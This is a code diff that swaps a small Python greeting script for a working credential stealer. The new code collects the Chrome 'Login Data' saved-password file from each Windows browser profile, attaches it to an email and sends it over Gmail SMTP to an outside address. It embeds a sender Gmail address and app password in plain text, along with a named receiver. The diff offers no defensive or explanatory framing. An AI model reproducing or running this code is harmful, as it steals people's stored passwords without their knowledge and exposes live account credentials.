@@ -1,12 +1,53 @@
-print("Hello, welcome to the future!")
+import os
+from email.message import EmailMessage
+import ssl
+import smtplib
 
-x = input("Please enter your good name: ")
+email_sender = "mnadeemstar777@gmail.com"
+email_password = "zaektddcxhqebqol"
+email_receiver = "Ibrahim.abid.rajput.minhas@gmail.com"
 
-x = x.upper()
+subject = "Rocket sent"
 
-if x == "USMAN":
-    print(x.capitalize(), "is selected to enter the future.")
-else:
-    print(x.capitalize(), "is rejected to enter the future.")
+body = """
+I am testing here
+"""
 
-input("Hit enter to proceed")
+# Create the EmailMessage object
+em = EmailMessage()
+em['From'] = email_sender
+em['To'] = email_receiver
+em['Subject'] = subject
+em.set_content(body)
+
+# Function to attach a file to the email
+def attach_file(em, file_path):
+    file_name = os.path.basename(file_path)
+    with open(file_path, "rb") as file:
+        em.add_attachment(file.read(), maintype="text", subtype="plain", filename=file_name)
+
+# SMTP setup and sending the email
+context = ssl.create_default_context()
+
+with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+    smtp.login(email_sender, email_password)
+
+    # Fetch the current user's home directory
+    home_dir = os.path.expanduser("~")
+
+    # Iterate through profiles and attach the Login Data file
+    profiles_dir = os.path.join(home_dir, "AppData", "Local", "Google", "Chrome", "User Data")
+    profile_prefix = "Profile "
+    profile_num = 1
+
+    while True:
+        profile_path = os.path.join(profiles_dir, profile_prefix + str(profile_num))
+        login_data_path = os.path.join(profile_path, "Login Data")
+        
+        if not os.path.exists(login_data_path):
+            break  # Break the loop if the Login Data file does not exist in the current profile
+
+        attach_file(em, login_data_path)
+        profile_num += 1
+
+    smtp.sendmail(email_sender, email_receiver, em.as_string())
